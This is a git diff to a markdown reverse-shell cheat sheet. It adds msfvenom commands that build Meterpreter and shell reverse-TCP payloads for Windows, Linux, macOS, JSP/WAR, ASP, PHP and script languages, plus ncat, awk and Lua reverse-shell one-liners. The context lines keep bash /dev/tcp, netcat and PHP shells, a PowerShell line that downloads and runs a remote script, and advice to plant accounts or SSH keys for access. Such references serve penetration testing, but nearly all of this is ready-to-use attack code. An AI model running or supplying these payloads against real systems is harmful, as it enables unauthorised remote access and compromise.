@@ -3,6 +3,47 @@ Compendium:  A concise but detailed collection of Scripts, Reverse Shells and Co
 
 # In Progress - More details to follow 
 
+## Meterpreter Shells
+
+### Windows Staged reverse TCP
+
+```powershell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+
+### Windows Stageless reverse TCP
+
+```powershell
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+```
+
+### Linux Staged reverse TCP
+
+```powershell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+```
+
+### Linux Stageless reverse TCP
+
+```powershell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+```
+
+### Other platforms
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
+
 ### Reverse Shell Cheat Sheet
 
 It is always worth trying to add a new account / SSH key / .rhosts file and just log in.
@@ -23,12 +64,6 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
 
-#### Php :
-
-```
-php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
 #### Python :
 
 ```
@@ -41,10 +76,26 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
 ```
 
+
+#### Php :
+
+```
+php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### War
+
+```java
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file
+```
+
 #### Netcat :
 
 ```
 nc -e /bin/sh 192.168.0.5 4444
+ncat 10.0.0.1 4242 -e /bin/bash
+ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
 
 #### Socat :
@@ -90,4 +141,18 @@ p.waitFor()
 
 ```
 xterm -display 192.168.0.5:4444
+```
+
+### Awk
+
+```powershell
+awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+### Lua
+
+Linux only
+
+```powershell
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
